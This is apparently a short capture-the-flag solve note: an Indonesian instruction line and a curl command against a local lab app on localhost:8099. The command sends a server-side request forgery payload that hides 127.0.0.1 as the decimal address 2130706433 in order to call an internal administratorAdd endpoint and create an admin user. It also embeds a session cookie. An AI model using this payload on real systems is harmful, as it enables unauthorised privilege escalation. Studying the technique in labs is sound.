

Curl to Solve; pastikan username, port, dan session token sesuai

```
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: localhost:8099' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Referer: http://localhost:8099/product' -H $'Content-Type: application/json' -H $'Content-Length: 125' -H $'Origin: http://localhost:8099' -H $'Connection: close' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' \
    -b $'session=.eJwVy7sOgjAYQOF36S7hpomOEjBtBAqUWtigYvyBAlEHqPHdhfmc74s-Y9cM6ISahTzri4QYCM41tiLAbzyke-nhA-4mwT1yNNbJkjZfahV8ymwNakVKwtUjS23PPW5HuIuolxtW3N1wyOQctb4OWeGEwjREqal_ThInE05FYXowTqDaDSZ9ZYRpN5VBc3NVnNMC_f73KTWW.ZknC9w.wZQZrQuVUsRNg-VyeMxSP2gUiGk' \
    --data-binary $'{\"name\":\"Produk\",\"price\":\"Baru\",\"description\":\"123\",\"manual\":\"http://2130706433:8099/service/administratorAdd?username=bang\"}' \
    $'http://localhost:8099/service/product'
```
